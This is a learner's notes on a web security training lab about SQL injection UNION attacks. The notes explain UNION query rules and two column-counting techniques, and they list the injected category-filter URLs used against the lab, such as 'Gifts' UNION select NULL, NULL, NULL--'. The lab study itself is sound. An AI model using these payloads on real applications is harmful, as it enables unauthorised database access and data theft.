# Description:
This lab contains a SQL injection vulnerability in the product category filter. 
The results from the query are returned in the application's response, so you can use a UNION attack 
to retrieve data from other tables. The first step of such an attack is to determine the number of columns 
that are being returned by the query. You will then use this technique in subsequent 
labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection 
UNION attack that returns an additional row containing null values.

# Analysis:
SQLi - Product category filter

End Goal: Determine the number of columns retuerned by the query.

Background (unions):

table1      table2
a | b       c | d
-----       -----
1 , 2       2 , 3
3 , 4       4 , 5

Query #1: select a, b from table1
Result:
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
Result:
1,2
3,4
2,3
4,5

Rule: 
 - The number and the order of the columns must be the same in all queries.
 - The data types must be compatible.

SQLi attack (way #1):

select ? from table1 UNION select NULL
- error -> If we get and error we know that we have an incorrect number of columns in the Union operator

select ? from table1 UNIONS select NULL, NULL
- error -> We keep incrementing the number of NULL values untill we no longer have an error

SQLi attack (way #2):

select a, b from table1 order by 1
select a, b from table1 order by 2
...
select a, b from table1 order by n

We keep incrementing the order by value untill we get an error, then we know that the number of columns
are n - 1.

Attacking the instance: 

1) - Query of the product filter: 
/filter?category=Gifts

2) - We add a ' to the query to see if the query is vulnerable to SQLi:
/filter?category=' 

3) - Then we can add a comment to not break the query:
/filter?category='-- 

4) - We can construct the query for our first SQLi attack:
/filter?category=Gifts' UNION select NULL--: number of columns 1 
/filter?category=Gifts' UNION select NULL, NULL--: number of columns 2
/filter?category=Gifts' UNION select NULL, NULL, NULL--: number of columns 3

Then we know that the number of columns is three

### Making the code:
The way we ant to call the code is the following: script.py <url> 



### Errors encountered: 

Error: 
    Traceback (most recent call last):
    File "/Users/luisfernandomendoza/Documents/web-security-academy/sql-injection/lab-03/sqli-lab-03.py", line 1, in <module>
    import requests
    ModuleNotFoundError: No module named 'requests'
Solution:
    1 - sudo pip3 install requests
    2 - Check the python interpreter: ctrl + shift + p, and look for 'Python: Select Interpreter'




